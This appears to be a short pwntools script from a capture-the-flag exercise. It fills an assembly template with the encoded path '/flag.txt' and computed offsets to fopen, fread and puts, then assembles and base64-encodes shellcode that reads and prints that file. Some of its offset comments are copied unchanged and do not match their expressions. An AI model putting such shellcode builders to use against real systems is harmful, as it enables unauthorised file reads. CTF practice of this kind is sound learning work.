from pwn import *

# context(os='linux', arch='amd64', log_level='debug')
context(os='linux', arch='amd64')


with open('payload.s','r') as fp:
    raw = fp.read()
templ = {
    'flagpath1': hex(int.from_bytes('/fla'.encode(), 'little')),
    'flagpath2': hex(int.from_bytes('g.tx'.encode(), 'little')),
    'flagpath3': hex(int.from_bytes(('t' + '\x00'*7).encode(), 'little')),
    'modepath': hex(int.from_bytes(('r' + '\x00'*7).encode(), 'little')),
    'flength': '0x100',
    'fstep': '0x1',
    'fopen_plt': hex(0x64 - 0x116 - 116), # 0xffffff8c = -116
    
    'fread_plt': hex(0xaf - 0x116 - 0x10f), # 0xffffff8c = -116
    
    'puts_plt': hex(0x129 - 0x116 - 0x199), # 0xffffff8c = -116

}
lines = raw.splitlines()
for i, line in enumerate(lines):
    if ';' in line:
        line = line.format(**templ)
        lines[i] = line[:line.index(';')]

assemb = '\n'.join(lines)

# print(assemb)

bcode = asm(assemb)
with open('payload.bin', 'wb') as f:
    f.write(bcode)

print(bcode)
print(b64e(bcode), len(bcode))